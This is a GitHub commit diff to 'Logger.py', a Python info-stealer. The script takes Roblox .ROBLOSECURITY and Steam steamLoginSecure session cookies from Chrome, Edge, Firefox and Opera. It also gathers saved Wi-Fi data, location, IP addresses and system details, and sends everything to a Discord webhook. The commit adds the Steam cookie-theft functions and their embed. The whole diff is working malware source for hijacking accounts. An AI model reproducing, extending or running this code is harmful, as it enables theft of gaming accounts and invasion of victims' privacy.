b1c2fc9759dcf817f8a82d85d3c70d7f1b30bca4
TurtlesXD <116833814+TurtlesXD@users.noreply.github.com>
2023-07-20 20:31:25 +0100

    Update Logger.py

--- Logger.py
+++ Logger.py
@@ -1,7 +1,6 @@
 #Import libraries
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import browser_cookie3
-import requests
 from urllib.request import urlopen
 import subprocess
 import json
@@ -11,7 +10,7 @@ import re
 import uuid
 import psutil
 
-webhook = DiscordWebhook(url='YourWebhookURL')#Set up webhook
+webhook = DiscordWebhook(url='YourWebhookHere')#Set up webhook
 
 def ip4():#Get ipv4
     try:
@@ -66,44 +65,83 @@ lat,long=latlong[0],latlong[1]
 
 def edge_logger():
     try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        return cookie
+        rcookies = browser_cookie3.edge(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        
+        return rcookie
     except Exception as e:
         print(f"Error occurred in edge_logger: {str(e)}")
         return []
 
 def chrome_logger():
     try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        return cookie
+        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        
+        return rcookie
     except Exception as e:
         print(f"Error occurred in chrome_logger: {str(e)}")
         return []
-
 def firefox_logger():
     try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        return cookie
+        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        
+        return rcookie
     except Exception as e:
         print(f"Error occurred in firefox_logger: {str(e)}")
         return []
 def opera_logger():
     try:
-        # Use 'opera gx' instead of 'opera'
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         return cookie
     except Exception as e:
         print(f"Error occurred in opera_logger: {str(e)}")
-        return []
+        return []  
 roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()
+
+def edge_steam():
+    try:
+        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
+        scookies=str(scookies)
+        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
+        return scookie
+    except Exception as e:
+        print(f"Error occurred in edge_logger: {str(e)}")
+        return []
+def chrome_steam():
+    try:
+        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
+        scookies=str(scookies)
+        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
+        return scookie
+    except Exception as e:
+        print(f"Error occurred in chrome_logger: {str(e)}")
+        return []
+def firefox_steam():
+    try:
+        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
+        scookies=str(scookies)
+        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
+        return scookie
+    except Exception as e:
+        print(f"Error occurred in firefox_logger: {str(e)}")
+        return []
+def opera_steam():
+    try:
+        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
+        scookies=str(scookies)
+        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
+        return scookie
+    except Exception as e:
+        print(f"Error occurred in opera_logger: {str(e)}")
+        return []
+steamchrome,steamedge,steamfire,steamopera=chrome_steam(),edge_steam(),firefox_steam(),opera_steam()
 
 def sysinfo():
     info={}
@@ -125,10 +163,12 @@ wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60c
 locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
+steamembed=DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{steamopera}```\nChrome:```{steamchrome}```\nEdge:```{steamedge}```\nFirefox:```{steamfire}```',color='4e6cd9')
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
 webhook.add_embed(locationembed)
 webhook.add_embed(robloxembed)
+webhook.add_embed(steamembed)
 
 webhook.execute()#Sends webhook
 
